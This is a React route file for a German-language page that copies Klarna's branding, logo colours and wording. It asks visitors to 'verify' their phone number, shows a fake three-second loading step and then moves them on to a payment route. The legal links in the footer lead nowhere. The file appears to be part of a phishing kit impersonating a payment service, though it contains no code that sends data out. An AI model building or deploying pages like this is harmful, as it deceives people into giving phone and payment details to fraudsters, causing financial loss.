import { useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { z } from "zod";
import { Smartphone, ShieldCheck, X } from "lucide-react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Willkommen bei Klarna" },
      { name: "description", content: "Verifiziere deine Handynummer, um mit Klarna sicher und flexibel zu bezahlen." },
      { property: "og:title", content: "Willkommen bei Klarna" },
      { property: "og:description", content: "Verifiziere deine Handynummer, um mit Klarna sicher und flexibel zu bezahlen." },
    ],
  }),
  component: Index,
});

function KlarnaBadge() {
  return (
    <span className="inline-flex items-center rounded-md px-3 py-1 text-3xl font-bold text-[#0b051d]" style={{ backgroundColor: "#FFA8CD" }}>
      Klarna
    </span>
  );
}

function PayIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <path d="M8.903 6.615c-.005-.943.386-1.457 1.087-1.461.7-.004 1.102.506 1.107 1.45.005.942-.391 1.456-1.092 1.46-.7.004-1.097-.506-1.102-1.45Zm10.264 4.218h-2.5v2.385c0 2.102-1.038 3.24-1.665 3.736l.009 1.933-.515.215A11.592 11.592 0 0 1 10.01 20H10a11.612 11.612 0 0 1-4.478-.898l-.51-.212-.01-2.045c-.626-.488-1.658-1.606-1.669-3.687V10.83l-2.498-.007L.833 2.5h18.334v8.333Zm-4.167 0H8.333v.776c.92.465 2.615 1.644 2.628 4.005l-1.667.009c-.01-1.985-2.033-2.67-2.053-2.677l-.574-.188V8.635a.815.815 0 0 0-.245-.577.743.743 0 0 0-.584-.238.843.843 0 0 0-.838.83v4.503c.01 1.852 1.16 2.477 1.209 2.503l.443.233.021 1.871a9.937 9.937 0 0 0 3.328.573h.008c1.125 0 2.266-.196 3.33-.571l-.008-1.76.464-.231c.038-.022 1.205-.67 1.205-2.553v-2.385Zm2.5-6.666h-15v5l.833-.002v-.512a2.458 2.458 0 0 1 .734-1.765 2.5 2.5 0 0 1 1.762-.735h.014c.66 0 1.281.256 1.751.72.473.468.736 1.092.74 1.758v.536H17.5v-5Z" fill="#0b051d" />
    </svg>
  );
}

const phoneSchema = z
  .string()
  .min(1, "Handynummer ist erforderlich")
  .refine((val) => /^[\+]?[\d\s]+$/.test(val), {
    message: "Bitte gib eine gültige Handynummer ein",
  })
  .refine((val) => val.replace(/\D/g, "").length >= 8, {
    message: "Die Nummer ist zu kurz",
  })
  .refine((val) => val.replace(/\D/g, "").length <= 15, {
    message: "Die Nummer ist zu lang",
  });

function formatPhoneNumber(value: string): string {
  let cleaned = value.replace(/[^0-9+]/g, "");
  cleaned = cleaned.replace(/(?!^)\+/g, "");

  if (cleaned.startsWith("+")) {
    return cleaned;
  }

  if (cleaned.startsWith("0") && cleaned.length > 4) {
    return `${cleaned.slice(0, 4)} ${cleaned.slice(4)}`.trim();
  }

  return cleaned;
}

function Index() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState("");
  const [error, setError] = useState<string | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhoneNumber(e.target.value);
    setPhone(formatted);
    const result = phoneSchema.safeParse(formatted);
    setError(result.success ? null : (result.error.errors[0]?.message ?? "Ungültige Eingabe"));
  };

  const isValid = phoneSchema.safeParse(phone).success;

  return (
    <div className="flex min-h-screen items-center justify-center bg-neutral-100 p-0 sm:p-4">
      <div className="relative flex h-screen sm:h-[calc(100vh-2rem)] max-h-none sm:max-h-[1043px] w-[600px] max-w-full flex-col overflow-y-auto rounded-2xl bg-white p-8 shadow-xl sm:p-10">
        <button
          type="button"
          aria-label="Schließen"
          className="absolute right-5 top-5 text-[#0b051d] transition-opacity hover:opacity-70"
        >
          <X className="h-6 w-6" />
        </button>

        <div className="flex flex-1 flex-col">
          <div className="mt-4 flex flex-wrap items-center justify-center gap-x-3 gap-y-2">
            <h1 className="text-3xl font-bold text-[#0b051d]">Willkommen bei</h1>
            <KlarnaBadge />
          </div>

          <p className="mx-auto mt-4 max-w-lg text-center text-[15px] text-[#373544]">
            Wir machen Zahlungen einfach und flexibel. Lass uns deine Nummer verifizieren.
          </p>

          <div className="relative mt-8 rounded-xl border border-neutral-300 px-4 transition-all focus-within:border-[#0b051d] focus-within:ring-1 focus-within:ring-[#0b051d]">
            <div className="flex h-[58px] items-center gap-3">
              <Smartphone className="h-5 w-5 text-[#0b051d]" strokeWidth={1.75} />
              <div className="relative flex h-full flex-1 flex-col justify-center">
                <input
                  id="phone"
                  type="tel"
                  value={phone}
                  onChange={handleChange}
                  aria-invalid={!!error}
                  aria-describedby={error ? "phone-error" : undefined}
                  placeholder=" "
                  className="peer block h-full w-full bg-transparent pb-1 pt-6 text-[16px] font-semibold text-[#373544] outline-none placeholder:text-transparent"
                />
                <label
                  htmlFor="phone"
                  className="pointer-events-none absolute left-0 top-1/2 -translate-y-1/2 text-[15px] font-normal text-[#6b6b6b] transition-all duration-200 peer-focus:top-2 peer-focus:-translate-y-0 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:-translate-y-0 peer-[:not(:placeholder-shown)]:text-[11px]"
                >
                  Handynummer
                </label>
              </div>
            </div>
          </div>
          {error && (
            <p id="phone-error" className="mt-2 text-xs text-red-600">
              {error}
            </p>
          )}

          <ul className="mt-6 space-y-4 text-[14px] text-[#373544]">
            <li className="flex items-center gap-3">
              <PayIcon />
              <span>
                Zahle <strong>sofort, in 30 Tagen</strong> oder <strong>teile die Kosten auf</strong>
              </span>
            </li>
            <li className="flex items-center gap-3">
              <ShieldCheck className="h-[22px] w-[22px]" strokeWidth={1.75} />
              <span>
                Shoppe mit <strong>Käuferschutz</strong> für berechtigte Käufe
              </span>
            </li>
            <li className="flex items-center gap-3">
              <Smartphone className="h-[22px] w-[22px]" strokeWidth={1.75} />
              <span>
                <strong>Verwalte Zahlungen und Bestellungen</strong> bequem per App
              </span>
            </li>
          </ul>

          <button
            type="button"
            disabled={!isValid}
            onClick={() => navigate({ to: "/loading", search: { to: "/payment", ms: 3000 } })}
            className="mt-auto w-full rounded-full bg-[#0b051d] py-4 text-[15px] font-semibold text-white transition-opacity hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-50"
          >
            Weiter
          </button>
        </div>

        <p className="mt-4 text-center text-[13px] text-[#373544]">
          Du bleibst <span className="text-[rgb(92,50,184)]">angemeldet</span>, damit du schneller zugreifen kannst
        </p>

        <div className="mt-4 flex justify-center gap-6 text-[13px]">
          <a href="#" className="text-[rgb(55,53,68)] underline">Nutzungsbedingungen</a>
          <a href="#" className="text-[rgb(55,53,68)] underline">Datenschutz</a>
          <a href="#" className="text-[rgb(55,53,68)] underline">Cookies</a>
        </div>
      </div>
    </div>
  );
}
